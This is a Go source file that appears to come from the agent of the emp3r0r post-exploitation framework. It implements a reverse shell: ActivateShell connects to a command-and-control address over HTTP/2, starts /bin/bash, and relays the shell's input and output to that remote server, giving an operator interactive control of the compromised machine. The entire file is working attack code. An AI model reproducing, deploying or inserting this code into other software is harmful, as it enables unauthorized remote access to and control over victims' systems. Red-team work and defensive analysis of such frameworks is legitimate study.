package agent

import (
	"log"
	"os/exec"

	"github.com/jm33-m0/emp3r0r/emagent/internal/tun"
	"github.com/posener/h2conn"
)

const (
	// Read buffer
	readBufSize = 128
)

// reverseShell - Execute a reverse shell to host
func reverseShell(shell string, send chan<- []byte, recv <-chan []byte) {
	cmd := exec.Command(shell)

	stdin, _ := cmd.StdinPipe()
	stdout, _ := cmd.StdoutPipe()
	stderr, _ := cmd.StderrPipe()

	go func() {
		for incoming := range recv {
			log.Printf("[*] shell stdin write: %v", incoming)
			_, err := stdin.Write(incoming)
			if err != nil {
				log.Print(err)
			}
		}
	}()

	go func() {
		for {
			buf := make([]byte, readBufSize)
			stderr.Read(buf)
			log.Printf("[*] shell stderr read: %v", buf)
			send <- buf
		}
	}()

	err := cmd.Start()
	if err != nil {
		log.Print(err)
	}
	for {
		buf := make([]byte, readBufSize)
		stdout.Read(buf)
		log.Printf("[*] shell stdout read: %v", buf)
		send <- buf
	}
}

// ActivateShell launch reverse shell and send it to CC
func ActivateShell() {
	var (
		err       error
		conn      *h2conn.Conn
		streamURL = CCAddress + tun.StreamAPI
	)
	conn, _, err = ConnectCC(streamURL)
	defer func() {
		err = conn.Close()
		if err != nil {
			log.Print(err)
		}
	}()
	shellPath := "/bin/bash"

	go reverseShell(shellPath, SendCC, RecvCC)

	go func() {
		for {
			data := make([]byte, readBufSize)
			_, err = conn.Read(data)
			if err != nil {
				log.Print(err)
			}
			RecvCC <- data
		}
	}()

	for outgoing := range SendCC {
		_, err = conn.Write(outgoing)
		if err != nil {
			log.Print(err)
		}
	}
}
